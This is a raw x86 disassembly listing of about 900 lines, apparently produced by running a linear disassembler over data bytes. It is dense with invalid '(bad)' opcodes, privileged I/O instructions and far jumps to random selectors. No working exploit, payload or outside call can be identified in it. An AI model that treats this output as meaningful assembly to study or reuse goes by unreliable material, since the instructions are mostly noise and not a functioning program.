  43d09a:	(bad)  
  43d09c:	cmp    ah,0xd2
  43d09f:	xor    ecx,DWORD PTR [esp+edi*8-0x373ee36]
  43d0a6:	ret    0x8c1f
  43d0a9:	cld    
  43d0aa:	mov    edx,0xb2fc8c57
  43d0af:	jno    0x43d03c
  43d0b1:	cld    
  43d0b2:	stos   BYTE PTR es:[edi],al
  43d0b3:	cmp    ecx,DWORD PTR [esp+edi*8-0x373965e]
  43d0ba:	call   0x8b97:0x92fc8b6d
  43d0c1:	cld    
  43d0c2:	mov    bl,BYTE PTR [ebp-0x567d0375]
  43d0c8:	mov    edi,esp
  43d0ca:	jp     0x43d061
  43d0cc:	mov    edi,esp
  43d0ce:	jb     0x43d08f
  43d0d0:	mov    edi,esp
  43d0d2:	push   0xffffffb9
  43d0d4:	mov    edi,esp
  43d0d6:	(bad)  
  43d0d8:	mov    edi,esp
  43d0da:	pop    edx
  43d0db:	add    bl,ch
  43d0dd:	mov    dl,BYTE PTR [ecx-0x29]
  43d0e0:	ror    BYTE PTR [edx-0x755328b7],0x41
  43d0e7:	xlat   BYTE PTR ds:[ebx]
  43d0e8:	pushf  
  43d0e9:	mov    bh,BYTE PTR [ecx]
  43d0eb:	xlat   BYTE PTR ds:[ebx]
  43d0ec:	jl     0x43d078
  43d0ee:	xor    edi,edx
  43d0f0:	mov    cs,WORD PTR [edx-0x759f28d7]
  43d0f6:	and    edi,edx
  43d0f8:	sub    BYTE PTR [edx-0x75ed28e7],cl
  43d0fe:	add    BYTE PTR [eax],al
  43d100:	add    BYTE PTR [eax],al
  43d102:	add    BYTE PTR [ecx],dl
  43d104:	xlat   BYTE PTR ds:[ebx]
  43d105:	cmp    cl,BYTE PTR [edx-0x75df28f7]
  43d10b:	add    edi,edx
  43d10d:	ror    BYTE PTR [ecx-0x761f2907],1
  43d113:	icebp  
  43d114:	(bad)  
  43d115:	loopne 0x43d0a0
  43d117:	jmp    0xe1d14df2
  43d11c:	(bad)  
  43d11d:	xchg   edx,eax
  43d11e:	(bad)  
  43d11f:	(bad)  
  43d121:	and    BYTE PTR [ebp+0x3e6d6d1],ah
  43d127:	jne    0x43d12b
  43d129:	mov    DWORD PTR [eax-0x4f8b293f],esi
  43d12f:	mov    ecx,0xb1b066d6
  43d134:	(bad)  
  43d135:	out    0x3,al
  43d137:	jne    0x43d13b
  43d139:	fild   WORD PTR [ebx]
  43d13b:	jne    0x43d0bf
  43d13d:	loopne 0x43d142
  43d13f:	jne    0x43d0c3
  43d141:	in     al,0x3
  43d143:	jne    0x43d0c7
  43d145:	out    dx,eax
  43d146:	add    esi,DWORD PTR [ebp-0x7e]
  43d149:	out    0x3,al
  43d14b:	jne    0x43d14f
  43d14d:	loope  0x43d0e5
  43d14f:	jns    0x43d127
  43d151:	not    BYTE PTR [ebp-0x69e5298f]
  43d157:	imul   edx,esi,0x276e8ff
  43d15d:	add    BYTE PTR [edi],ch
  43d15f:	add    edx,edi
  43d161:	clc    
  43d162:	fwait
  43d163:	call   0xc3ca3e
  43d168:	add    BYTE PTR [eax],al
  43d16a:	add    BYTE PTR [eax],al
  43d16c:	loopne 0x43d144
  43d16e:	clc    
  43d16f:	jnp    0x43d159
  43d171:	(bad)  
  43d172:	clc    
  43d173:	dec    edi
  43d174:	jecxz  0x43d14c
  43d176:	clc    
  43d177:	push   ebx
  43d178:	or     edx,edi
  43d17a:	clc    
  43d17b:	pop    ss
  43d17c:	add    edx,edi
  43d17e:	clc    
  43d17f:	and    DWORD PTR [ebx],ecx
  43d181:	xlat   BYTE PTR ds:[ebx]
  43d182:	clc    
  43d183:	in     eax,dx
  43d184:	add    bh,dl
  43d186:	clc    
  43d187:	aad    0xe8
  43d189:	(bad)  
  43d18a:	clc    
  43d18b:	out    dx,eax
  43d18c:	jbe    0x43d190
  43d18e:	cmp    bh,0xe8
  43d191:	(bad)  
  43d192:	clc    
  43d193:	out    0xe0,eax
  43d195:	(bad)  
  43d196:	clc    
  43d197:	or     DWORD PTR ds:0xd85f8d7,0xffffffd7
  43d19e:	clc    
  43d19f:	popf   
  43d1a0:	std    
  43d1a1:	(bad)  
  43d1a2:	clc    
  43d1a3:	stos   DWORD PTR es:[edi],eax
  43d1a4:	std    
  43d1a5:	(bad)  
  43d1a6:	clc    
  43d1a7:	xchg   edi,eax
  43d1a8:	in     eax,dx
  43d1a9:	(bad)  
  43d1aa:	clc    
  43d1ab:	sub    ebp,0xdd63f8d6
  43d1b1:	(bad)  
  43d1b2:	clc    
  43d1b3:	int    0xdd
  43d1b5:	(bad)  
  43d1b6:	clc    
  43d1b7:	int    0xd
  43d1b9:	xlat   BYTE PTR ds:[ebx]
  43d1ba:	clc    
  43d1bb:	scas   eax,DWORD PTR es:[edi]
  43d1bc:	or     eax,0x76e9f8d7
  43d1c1:	add    al,BYTE PTR [eax]
  43d1c3:	or     eax,DWORD PTR [edx]
  43d1c5:	xlat   BYTE PTR ds:[ebx]
  43d1c6:	clc    
  43d1c7:	jmp    0x6f43d442
  43d1cc:	jmp    0x43d1a4
  43d1ce:	clc    
  43d1cf:	xchg   ebx,eax
  43d1d0:	add    BYTE PTR [eax],al
  43d1d2:	add    BYTE PTR [eax],al
  43d1d4:	add    bl,ah
  43d1d6:	(bad)  
  43d1d7:	clc    
  43d1d8:	mov    ebx,ebx
  43d1da:	(bad)  
  43d1db:	clc    
  43d1dc:	add    BYTE PTR [eax],ch
  43d1de:	je     0x43d1db
  43d1e0:	jmp    FWORD PTR [eax]
  43d1e2:	je     0x43d1df
  43d1e4:	push   DWORD PTR [esp+esi*2]
  43d1e7:	sti    
  43d1e8:	inc    DWORD PTR [esi+0x74]
  43d1eb:	sti    
  43d1ec:	dec    DWORD PTR [eax+0x76]
  43d1ef:	sti    
  43d1f0:	jmp    FWORD PTR [eax]
  43d1f2:	je     0x43d1ef
  43d1f4:	push   DWORD PTR [esp+esi*2]
  43d1f7:	sti    
  43d1f8:	inc    DWORD PTR [esp+esi*2]
  43d1fb:	sti    
  43d1fc:	jmp    eax
  43d1fe:	jae    0x43d1fb
  43d200:	push   esi
  43d202:	jae    0x43d1ff
  43d204:	push   edx
  43d206:	jae    0x43d203
  43d208:	inc    eax
  43d20a:	je     0x43d207
  43d20c:	call   FWORD PTR [esp+esi*2+0x7464fffb]
  43d213:	sti    
  43d214:	inc    DWORD PTR [esp+esi*2-0x5]
  43d218:	call   esp
  43d21a:	jbe    0x43d217
  43d21c:	call   DWORD PTR [edi+esi*2]
  43d21f:	sti    
  43d220:	jmp    FWORD PTR [esi+0x77]
  43d223:	sti    
  43d224:	call   esi
  43d226:	js     0x43d223
  43d228:	jmp    FWORD PTR [eax+edi*2+0x76fafffb]
  43d22f:	sti    
  43d230:	call   FWORD PTR [eax]
  43d232:	jns    0x43d22f
  43d234:	dec    DWORD PTR [eax]
  43d236:	jns    0x43d233
  43d238:	inc    DWORD PTR [eax]
  43d23a:	add    BYTE PTR [eax],al
  43d23c:	add    BYTE PTR [eax],al
  43d23e:	cli    
  43d23f:	js     0x43d23c
  43d241:	(bad)  
  43d242:	mov    edx,0x24fffb78
  43d247:	jbe    0x43d244
  43d249:	dec    DWORD PTR [eax+0x76]
  43d24c:	sti    
  43d24d:	call   FWORD PTR [eax]
  43d24f:	jbe    0x43d24c
  43d251:	call   DWORD PTR [esi]
  43d253:	jbe    0x43d250
  43d255:	inc    DWORD PTR [esi+0x76]
  43d258:	sti    
  43d259:	push   DWORD PTR [ebp+0x13]
  43d25c:	pushf  
  43d25d:	cld    
  43d25e:	jp     0x43d25c
  43d260:	fwait
  43d261:	cld    
  43d262:	jb     0x43d23a
  43d264:	xchg   esp,eax
  43d265:	cld    
  43d266:	push   0xffffffe8
  43d268:	xchg   ebp,eax
  43d269:	cld    
  43d26a:	bound  ecx,QWORD PTR [esi+edx*4-0x6967a504]
  43d271:	cld    
  43d272:	push   edx
  43d273:	or     dl,BYTE PTR [esi-0x6931b504]
  43d279:	cld    
  43d27a:	inc    edx
  43d27b:	loop   0x43d213
  43d27d:	cld    
  43d27e:	cmp    dh,BYTE PTR [edx-0x51cd036b]
  43d284:	xchg   ebp,eax
  43d285:	cld    
  43d286:	sub    dh,BYTE PTR [ebp+edx*4-0x4]
  43d28a:	and    bl,BYTE PTR [ebp+edx*4-0x6b2fe504]
  43d291:	cld    
  43d292:	adc    dh,BYTE PTR [esi]
  43d294:	pushf  
  43d295:	cld    
  43d296:	or     dh,BYTE PTR [esi+edx*4]
  43d299:	cld    
  43d29a:	add    bh,BYTE PTR [eax]
  43d29c:	xchg   esi,eax
  43d29d:	cld    
  43d29e:	cli    
  43d29f:	inc    edi
  43d2a0:	xchg   esi,eax
  43d2a1:	cld    
  43d2a2:	add    BYTE PTR [eax],al
  43d2a4:	add    BYTE PTR [eax],al
  43d2a6:	add    dl,dh
  43d2a8:	aaa    
  43d2a9:	xchg   esi,eax
  43d2aa:	cld    
  43d2ab:	jmp    0xa03b:0xe2fca05f
  43d2b2:	cld    
  43d2b3:	fisub  DWORD PTR [ebx]
  43d2b5:	mov    al,ds:0xa017d2fc
  43d2ba:	cld    
  43d2bb:	retf   0xa043
  43d2be:	cld    
  43d2bf:	ret    0xa02d
  43d2c2:	cld    
  43d2c3:	mov    edx,0xb2fc98b5
  43d2c8:	fistp  WORD PTR [eax-0x60045504]
  43d2ce:	cld    
  43d2cf:	mov    ds:0x9afc98d7,al
  43d2d4:	mov    eax,ds:0x292fc9a
  43d2d9:	fstp   DWORD PTR [ebp-0x623b2c77]
  43d2df:	adc    ebx,0xd3799df4
  43d2e5:	or     BYTE PTR [esi-0x62092c8f],bl
  43d2eb:	imul   edx,ebx,0xd3619e1c
  43d2f1:	sub    BYTE PTR [esi-0x61cd2ca7],bl
  43d2f7:	push   ecx
  43d2f8:	rol    DWORD PTR [ecx+ebp*4-0x569f2cb7],cl
  43d2ff:	inc    ecx
  43d300:	rcr    DWORD PTR [eax-0x57],cl
  43d303:	cmp    ebx,edx
  43d305:	inc    edx
  43d306:	test   eax,0xa91cd331
  43d30b:	add    BYTE PTR [eax],al
  43d30d:	add    BYTE PTR [eax],al
  43d30f:	add    BYTE PTR [ecx],ch
  43d311:	shr    DWORD PTR [esi],cl
  43d313:	test   eax,0xa8f8d321
  43d318:	sbb    ebx,edx
  43d31a:	add    BYTE PTR [ecx-0x57132cef],ch
  43d320:	or     ebx,edx
  43d322:	sahf   
  43d323:	test   al,0x1
  43d325:	ror    DWORD PTR [eax+0x2cd2f9a8],cl
  43d32b:	test   al,0xf1
  43d32d:	shr    BYTE PTR [edx-0x53],cl
  43d330:	jmp    0xe1f0c607
  43d335:	sar    dh,cl
  43d337:	lods   al,BYTE PTR ds:[esi]
  43d338:	(bad)  
  43d33a:	adc    BYTE PTR [ebp-0x53512d2f],ch
  43d340:	leave  
  43d341:	rcr    BYTE PTR [ebp*4-0x52fd2d3f],cl
  43d348:	mov    ecx,0xb1ad06d2
  43d34d:	rcl    ah,cl
  43d34f:	lods   al,BYTE PTR ds:[esi]
  43d350:	test   eax,0xa1a7c0d2
  43d355:	sar    bh,cl
  43d357:	mov    al,0xd2
  43d359:	aad    0xf8
  43d35b:	imul   ebx,ebp,0xdd7bf8d5
  43d361:	aad    0xf8
  43d363:	dec    ecx
  43d364:	int    0xd5
  43d366:	clc    
  43d367:	pop    ecx
  43d368:	int    0xd5
  43d36a:	clc    
  43d36b:	and    eax,0x21f8cf1d
  43d370:	sbb    eax,0xb1f8cf
  43d375:	add    BYTE PTR [eax],al
  43d377:	add    BYTE PTR [eax],al
  43d379:	sbb    cl,bh
  43d37b:	clc    
  43d37c:	jmp    0x9f43d5f7
  43d381:	jmp    0xf8ce:0xed1ff8ce
  43d388:	std    
  43d389:	jmp    0xf8ce:0xe3d7f8ce
  43d390:	(bad)  
  43d391:	or     ecx,edi
  43d393:	clc    
  43d394:	fwait
  43d395:	add    ecx,edi
  43d397:	clc    
  43d398:	jge    0x43d3a5
  43d39a:	iret   
  43d39b:	clc    
  43d39c:	pop    DWORD PTR [ebx]
  43d39e:	iret   
  43d39f:	clc    
  43d3a0:	popa   
  43d3a1:	jmp    0x43d371
  43d3a3:	clc    
  43d3a4:	adc    esp,edx
  43d3a6:	into   
  43d3a7:	clc    
  43d3a8:	xor    eax,0xd7f8ceea
  43d3ad:	jecxz  0x43d37d
  43d3af:	clc    
  43d3b0:	ror    DWORD PTR [ebx],0xcf
  43d3b3:	clc    
  43d3b4:	loope  0x43d3b9
  43d3b6:	iret   
  43d3b7:	clc    
  43d3b8:	in     eax,0xb
  43d3ba:	iret   
  43d3bb:	clc    
  43d3bc:	add    DWORD PTR [eax],0xffffffcf
  43d3bf:	clc    
  43d3c0:	xchg   edi,eax
  43d3c1:	call   0xe06fcc94
  43d3c6:	into   
  43d3c7:	clc    
  43d3c8:	(bad)
  43d3cc:	fneni(8087 only) 
  43d3ce:	into   
  43d3cf:	clc    
  43d3d0:	popa   
  43d3d1:	or     bh,cl
  43d3d3:	clc    
  43d3d4:	add    BYTE PTR [eax],dl
  43d3d6:	ja     0x43d3d3
  43d3d8:	dec    DWORD PTR [ebp+eax*1+0x0]
  43d3df:	add    BYTE PTR [eax],al
  43d3e1:	add    BYTE PTR [ebp+eax*1+0x5c88000],bh
  43d3e8:	add    BYTE PTR [eax-0x7ffffa78],al
  43d3ee:	mov    DWORD PTR ds:0x57a8000,eax
  43d3f4:	add    BYTE PTR [eax-0x7ffffaa6],al
  43d3fa:	dec    esi
  43d3fb:	jbe    0x43d3f8
  43d3fd:	(bad)  
  43d3fe:	cmp    BYTE PTR [esi-0x5],dh
  43d401:	push   ebx
  43d403:	add    al,0x0
  43d405:	and    al,0x76
  43d408:	sti    
  43d409:	dec    DWORD PTR [esi+0x5]
  43d40c:	add    BYTE PTR [eax-0x48a50],al
  43d412:	scas   al,BYTE PTR es:[edi]
  43d413:	jne    0x43d410
  43d415:	jmp    DWORD PTR [ebp+esi*2-0x5]
  43d419:	jmp    DWORD PTR [ebp+esi*2-0x5]
  43d41d:	call   FWORD PTR [ecx]
  43d41f:	add    eax,0x74208000
  43d424:	sti    
  43d425:	call   FWORD PTR [eax]
  43d427:	add    eax,0x66f8000
  43d42c:	add    BYTE PTR [eax-0x7ffffaf2],al
  43d432:	sti    
  43d433:	add    al,0x0
  43d435:	sbb    ah,0x73
  43d438:	sti    
  43d439:	(bad)  
  43d43a:	in     al,dx
  43d43b:	add    al,0x0
  43d43d:	or     bh,0x4
  43d440:	add    BYTE PTR [eax-0x7ffffb41],al
  43d446:	add    BYTE PTR [eax],al
  43d448:	add    BYTE PTR [eax],al
  43d44a:	add    bl,bl
  43d44c:	add    al,0x0
  43d44e:	add    cl,0x4
  43d451:	add    BYTE PTR [eax-0x489da],al
  43d457:	jne    0x43d433
  43d459:	cld    
  43d45a:	push   ebp
  43d45c:	leave  
  43d45d:	cld    
  43d45e:	push   ebp
  43d460:	(bad)  
  43d462:	push   DWORD PTR [ebp+0x33]
  43d465:	cwde   
  43d466:	cld    
  43d467:	call   0x981e:0x92fc980c
  43d46e:	cld    
  43d46f:	mov    ah,al
  43d471:	xchg   ecx,eax
  43d472:	cld    
  43d473:	or     dl,0x91
  43d476:	cld    
  43d477:	jp     0x43d44f
  43d479:	xchg   ecx,eax
  43d47a:	cld    
  43d47b:	jb     0x43d445
  43d47d:	xchg   ecx,eax
  43d47e:	cld    
  43d47f:	push   0xffffff8a
  43d481:	xchg   ecx,eax
  43d482:	cld    
  43d483:	(bad)  
  43d485:	xchg   ecx,eax
  43d486:	cld    
  43d487:	pop    edx
  43d488:	mov    al,ds:0x7652fc91
  43d48d:	xchg   ecx,eax
  43d48e:	cld    
  43d48f:	dec    edx
  43d490:	dec    eax
  43d491:	xchg   ecx,eax
  43d492:	cld    
  43d493:	inc    edx
  43d494:	inc    esi
  43d495:	xchg   ecx,eax
  43d496:	cld    
  43d497:	cmp    cl,BYTE PTR [eax-0x6f]
  43d49a:	cld    
  43d49b:	xor    ch,al
  43d49d:	xchg   esi,eax
  43d49e:	cld    
  43d49f:	sub    bl,dl
  43d4a1:	cld    
  43d4a2:	push   DWORD PTR [ebp+0x6f]
  43d4a5:	scas   eax,DWORD PTR es:[edi]
  43d4a6:	cld    
  43d4a7:	sbb    ah,BYTE PTR [esi+0x5612fcaf]
  43d4ad:	mov    al,0xfc
  43d4af:	add    BYTE PTR [eax],al
  43d4b1:	add    BYTE PTR [eax],al
  43d4b3:	add    BYTE PTR [edx],cl
  43d4b5:	cmp    al,0xb0
  43d4b7:	cld    
  43d4b8:	add    dl,BYTE PTR [eax+esi*4-0x4]
  43d4bc:	cli    
  43d4bd:	icebp  
  43d4be:	scas   al,BYTE PTR es:[edi]
  43d4bf:	cld    
  43d4c0:	repnz add eax,0xe9eafcaf
  43d4c6:	scas   al,BYTE PTR es:[edi]
  43d4c7:	cld    
  43d4c8:	loop   0x43d4e3
  43d4ca:	scas   eax,DWORD PTR es:[edi]
  43d4cb:	cld    
  43d4cc:	fcmovu st,st(1)
  43d4ce:	cld    
  43d4cf:	push   DWORD PTR [ebp+0x52]
  43d4d2:	add    DWORD PTR [ecx+0x54],edx
  43d4d5:	add    dl,al
  43d4d7:	push   edi
  43d4d8:	aaa    
  43d4d9:	pop    edi
  43d4da:	aad    0x34
  43d4dc:	push   edx
  43d4dd:	pusha  
  43d4de:	retf   0x166f
  43d4e1:	aas    
  43d4e2:	lds    ebp,FWORD PTR [ebp+0x16]
  43d4e5:	arpl   WORD PTR [ebx-0x4ffb3cfd],di
  43d4eb:	jno    0x43d4ff
  43d4ed:	push   esi
  43d4ee:	shl    BYTE PTR [edx+0x21],0x59
  43d4f2:	lods   eax,DWORD PTR ds:[esi]
  43d4f3:	dec    ax
  43d4f5:	push   esp
  43d4f6:	nop
  43d4f7:	push   edi
  43d4f8:	sbb    ah,BYTE PTR [ebx-0x78]
  43d4fb:	outs   dx,DWORD PTR ds:[esi]
  43d4fc:	sub    BYTE PTR [ebp-0x7a],ah
  43d4ff:	push   edi
  43d500:	ficomp DWORD PTR [edi+0x79]
  43d503:	add    esp,DWORD PTR [edx-0x3d994cfd]
  43d509:	pop    eax
  43d50a:	test   BYTE PTR [ebx+ecx*8+0x59],al
  43d50e:	jnp    0x43d57a
  43d510:	mov    al,0x61
  43d512:	jnp    0x43d548
  43d514:	(bad)  
  43d515:	arpl   WORD PTR [ebx+0x6d],bx
  43d518:	add    BYTE PTR [eax],al
  43d51a:	add    BYTE PTR [eax],al
  43d51c:	add    ah,cl
  43d51e:	pusha  
  43d51f:	out    0x3,eax
  43d521:	dec    edi
  43d522:	add    ch,BYTE PTR [esi+ebp*2]
  43d525:	test   eax,0x9b435565
  43d52a:	pop    ecx
  43d52b:	cmp    ebp,DWORD PTR [ebp-0x40]
  43d52e:	popa   
  43d52f:	dec    ebx
  43d530:	xor    edx,DWORD PTR [esi-0x6392c49d]
  43d536:	pusha  
  43d537:	out    0x3,eax
  43d539:	cmp    al,BYTE PTR [edx]
  43d53b:	sub    ebp,DWORD PTR [ecx-0x6f]
  43d53e:	adc    ebp,DWORD PTR gs:[ecx+0x38]
  43d542:	push   esp
  43d543:	add    BYTE PTR [eax+0x5a],bl
  43d546:	arpl   WORD PTR [eax],cx
  43d548:	jo     0x43d582
  43d54a:	gs push es
  43d54c:	pop    eax
  43d54d:	pop    edx
  43d54e:	pop    edi
  43d54f:	or     DWORD PTR [ebx+ebp*1],eax
  43d552:	add    al,BYTE PTR [eax]
  43d554:	sub    al,BYTE PTR [ebp+0x59]
  43d557:	ins    DWORD PTR es:[edi],dx
  43d558:	add    al,0x39
  43d55a:	das    
  43d55b:	push   0xffffffcd
  43d55d:	push   edx
  43d55e:	arpl   WORD PTR [eax],ax
  43d560:	jp     0x43d5d9
  43d562:	inc    ecx
  43d563:	arpl   bp,bx
  43d565:	push   0x67
  43d567:	pop    ebp
  43d568:	ret    0x5937
  43d56b:	jae    0x43d544
  43d56d:	dec    edx
  43d56e:	add    al,BYTE PTR [eax]
  43d570:	sub    BYTE PTR [ebp+0x36],ch
  43d573:	arpl   WORD PTR [ebx-0x379598fb],di
  43d579:	and    ah,BYTE PTR [ebx+0x54]
  43d57c:	xchg   ecx,eax
  43d57d:	and    al,0x63
  43d57f:	pop    edi
  43d580:	test   DWORD PTR [eax],eax
  43d582:	add    BYTE PTR [eax],al
  43d584:	add    BYTE PTR [eax],al
  43d586:	jbe    0x43d558
  43d588:	(bad)  
  43d589:	lods   eax,DWORD PTR ds:[esi]
  43d58a:	fst    QWORD PTR [esi+0x4c]
  43d58d:	mov    bh,al
  43d58f:	push   esi
  43d590:	inc    ebx
  43d591:	jnp    0x43d557
  43d593:	pop    ebx
  43d594:	outs   dx,BYTE PTR ds:[esi]
  43d595:	jmp    0x9e47a910
  43d59a:	fldenv [ebp+0x74]
  43d59d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d59e:	fistp  DWORD PTR [ebx+ecx*2+0x5c]
  43d5a2:	lds    edx,FWORD PTR [esi+0x67]
  43d5a5:	pop    ecx
  43d5a6:	lds    esp,FWORD PTR [ecx+0x49]
  43d5a9:	dec    ebx
  43d5aa:	lahf   
  43d5ab:	popa   
  43d5ac:	pop    ebp
  43d5ad:	push   ebp
  43d5ae:	mov    BYTE PTR [edx],0x0
  43d5b1:	shl    DWORD PTR [esi+0x46],1
  43d5b4:	jae    0x43d5ef
  43d5b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d5b7:	gs pop ebp
  43d5b9:	dec    eax
  43d5ba:	lods   eax,DWORD PTR ds:[esi]
  43d5bb:	popa   
  43d5bc:	dec    eax
  43d5bd:	dec    eax
  43d5be:	fwait
  43d5bf:	data16 ins BYTE PTR es:[edi],dx
  43d5c1:	or     al,0x79
  43d5c3:	inc    DWORD PTR [ebx]
  43d5c5:	cmp    ecx,DWORD PTR [edi+ebx*2+0x365c0473]
  43d5cc:	push   0x642d5c1b
  43d5d1:	add    ah,cl
  43d5d3:	add    DWORD PTR [ebp+0x5d308f00],ebp
  43d5d9:	popa   
  43d5da:	rcr    BYTE PTR [edx+0x54],1
  43d5dd:	push   0x64595ace
  43d5e2:	int3   
  43d5e3:	add    DWORD PTR [ebp+0x5],eax
  43d5e6:	test   al,0x30
  43d5e8:	je     0x43d65c
  43d5ea:	add    BYTE PTR [eax],al
  43d5ec:	add    BYTE PTR [eax],al
  43d5ee:	add    BYTE PTR [eax-0x63be99a6],bh
  43d5f4:	add    DWORD PTR [ebx+0x2],edi
  43d5f7:	rcr    DWORD PTR [edx+0x74],cl
  43d5fa:	push   esp
  43d5fb:	mov    cl,0x52
  43d5fd:	jo     0x43d645
  43d5ff:	mov    ch,0x5d
  43d601:	pop    ebp
  43d602:	dec    esi
  43d603:	mov    ebp,0x8c575d52
  43d608:	add    DWORD PTR [eax+0x3],esp
  43d60b:	leave  
  43d60c:	pop    esp
  43d60d:	outs   dx,BYTE PTR ds:[esi]
  43d60e:	and    bl,BYTE PTR gs:[esi+0x6c]
  43d612:	adc    DWORD PTR gs:[ecx],ebp
  43d615:	dec    edi
  43d616:	add    BYTE PTR [esi-0xe93b4fb],bl
  43d61c:	pop    ecx
  43d61d:	jo     0x43d61f
  43d61f:	jbe    0x43d627
  43d621:	aas    
  43d622:	rol    BYTE PTR gs:[edi+0x61],0x6c
  43d627:	mov    cl,0x41
  43d629:	je     0x43d69f
  43d62b:	sahf   
  43d62c:	pop    ecx
  43d62d:	pop    edx
  43d62e:	jne    0x43d600
  43d630:	imul   edx,DWORD PTR gs:[edi+0x1c],0x1
  43d635:	retf   0x6402
  43d638:	gs pop ecx
  43d63a:	jo     0x43d6ba
  43d63c:	cmp    DWORD PTR gs:[eax+edi*4+0x5f],ebp
  43d641:	pop    ebx
  43d642:	add    bh,dl
  43d644:	inc    DWORD PTR [edi+0x65]
  43d647:	ins    DWORD PTR es:[edi],dx
  43d648:	cmp    DWORD PTR ss:[eax+ebp*2+0x5f],ebp
  43d64d:	pop    ebx
  43d64e:	add    BYTE PTR [ebp-0x5c],dh
  43d651:	std    
  43d652:	inc    edi
  43d653:	add    BYTE PTR [eax],al
  43d655:	add    BYTE PTR [eax],al
  43d657:	add    BYTE PTR [eax-0x6],dl
  43d65a:	push   ebx
  43d65b:	inc    edx
  43d65c:	addr16 (bad) 
  43d65e:	pusha  
  43d65f:	add    BYTE PTR [ebp+0x11],dh
  43d662:	inc    BYTE PTR [eax+0x58]
  43d665:	iret   
  43d666:	sub    al,0x6e
  43d668:	pop    edx
  43d669:	clc    
  43d66a:	pusha  
  43d66b:	ins    DWORD PTR es:[edi],dx
  43d66c:	inc    esi
  43d66d:	xchg   ebx,eax
  43d66e:	popa   
  43d66f:	pop    edi
  43d670:	inc    ebp
  43d671:	(bad)  
  43d673:	retf   0xa377
  43d676:	popa   
  43d677:	pop    edi
  43d678:	and    eax,0x14634e98
  43d67d:	(bad)  
  43d67e:	popa   
  43d67f:	add    BYTE PTR [ebp-0x1d],dh
  43d682:	inc    BYTE PTR [eax+0x18]
  43d685:	(bad)
  43d689:	xchg   esi,eax
  43d68a:	push   0x6a7a2d63
  43d68f:	or     DWORD PTR fs:[esi-0x618affcd],eax
  43d696:	inc    BYTE PTR [eax-0x30]
  43d699:	jne    0x43d6c7
  43d69b:	outs   dx,BYTE PTR ds:[esi]
  43d69c:	sar    BYTE PTR [eax+0x3d],cl
  43d69f:	rol    DWORD PTR fs:[edi+0x62],1
  43d6a3:	ins    DWORD PTR es:[edi],dx
  43d6a4:	(bad)  
  43d6a5:	frndint 
  43d6a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d6a8:	jne    0x43d642
  43d6aa:	dec    esi
  43d6ab:	arpl   sp,dx
  43d6ad:	sub    eax,0x3ed04e61
  43d6b2:	imul   esi,DWORD PTR [eax+ebx*4+0xd],0x6c
  43d6b7:	outs   dx,BYTE PTR ds:[esi]
  43d6b8:	nop
  43d6b9:	cmp    ch,BYTE PTR [eax+0x0]
  43d6bc:	add    BYTE PTR [eax],al
  43d6be:	add    BYTE PTR [eax],al
  43d6c0:	add    BYTE PTR [ebp+0x59],dh
  43d6c3:	add    BYTE PTR [ecx-0x5b],cl
  43d6c6:	inc    esi
  43d6c7:	push   0x50
  43d6c9:	xchg   DWORD PTR [edi+ebx*2+0x63],eax
  43d6cd:	xchg   BYTE PTR [eax],cl
  43d6cf:	add    al,0xeb
  43d6d1:	jns    0x43d6d5
  43d6d3:	cmp    DWORD PTR [ebx-0x75],ebp
  43d6d6:	push   esi
  43d6d7:	adc    al,0x63
  43d6d9:	popa   
  43d6da:	inc    esp
  43d6db:	adc    eax,0xf455667
  43d6e0:	add    al,0x7
  43d6e2:	add    BYTE PTR [edi],dl
  43d6e4:	push   edx
  43d6e5:	dec    esp
  43d6e6:	pop    edi
  43d6e7:	add    al,0x51
  43d6e9:	pusha  
  43d6ea:	lgs    eax,FWORD PTR [ebp+0x52]
  43d6ee:	push   eax
  43d6ef:	not    BYTE PTR [edi+0x24]
  43d6f2:	add    bh,BYTE PTR [edi+0x0]
  43d6f5:	and    eax,0x1660ca50
  43d6fa:	dec    edi
  43d6fb:	(bad)  
  43d6fc:	adc    BYTE PTR [ebx+0x3c],bl
  43d6ff:	les    ebx,FWORD PTR [ebx+0x29]
  43d702:	xor    esp,edi
  43d704:	add    ebx,edi
  43d706:	add    ah,BYTE PTR [esi-0x449ee9af]
  43d70c:	and    WORD PTR [ebx-0x46],bx
  43d710:	outs   dx,DWORD PTR ds:[esi]
  43d711:	or     eax,0x48539365
  43d716:	adc    BYTE PTR [esi-0x69ad2d93],dh
  43d71c:	imul   ebx,esp,0x56
  43d71f:	out    0x3,eax
  43d721:	inc    DWORD PTR [ecx]
  43d723:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d724:	push   ecx
  43d725:	add    BYTE PTR [eax],al
  43d727:	add    BYTE PTR [eax],al
  43d729:	add    dh,dl
  43d72b:	popa   
  43d72c:	jae    0x43d794
  43d72e:	mov    esi,0xcd667b55
  43d733:	xor    esp,edi
  43d735:	add    edi,DWORD PTR [esi-0x29abce01]
  43d73b:	pop    esp
  43d73c:	sub    al,0x51
  43d73e:	test   eax,0x75334f65
  43d743:	add    cl,ch
  43d745:	pop    es
  43d746:	mov    bl,0x65
  43d748:	push   ebx
  43d749:	popa   
  43d74a:	mov    edx,0x8649444f
  43d74f:	push   esi
  43d750:	add    BYTE PTR [ecx+ebp*4+0x2],cl
  43d754:	add    BYTE PTR [esi+0x7a],al
  43d757:	aaa    
  43d758:	jae    0x43d76f
  43d75a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d75b:	arpl   WORD PTR [esi],di
  43d75d:	and    BYTE PTR [ebp+0x5f],al
  43d760:	push   esp
  43d761:	push   es
  43d762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d763:	arpl   WORD PTR [esp+eax*1+0x3a],sp
  43d767:	pop    edx
  43d768:	pop    edi
  43d769:	sti    
  43d76a:	jbe    0x43d7a4
  43d76c:	add    ecx,DWORD PTR ds:0x56e562a
  43d772:	push   esp
  43d773:	pop    eax
  43d774:	push   ecx
  43d775:	jmp    0xb54111f0
  43d77a:	dec    edi
  43d77b:	sub    eax,0x5c34cd5f
  43d780:	arpl   sp,cx
  43d782:	jbe    0x43d74d
  43d784:	(bad)  
  43d785:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d786:	adc    eax,0xcc84856
  43d78b:	data16 ins BYTE PTR es:[edi],dx
  43d78d:	les    eax,FWORD PTR [eax]
  43d78f:	add    BYTE PTR [eax],al
  43d791:	add    BYTE PTR [eax],al
  43d793:	inc    ecx
  43d794:	pop    eax
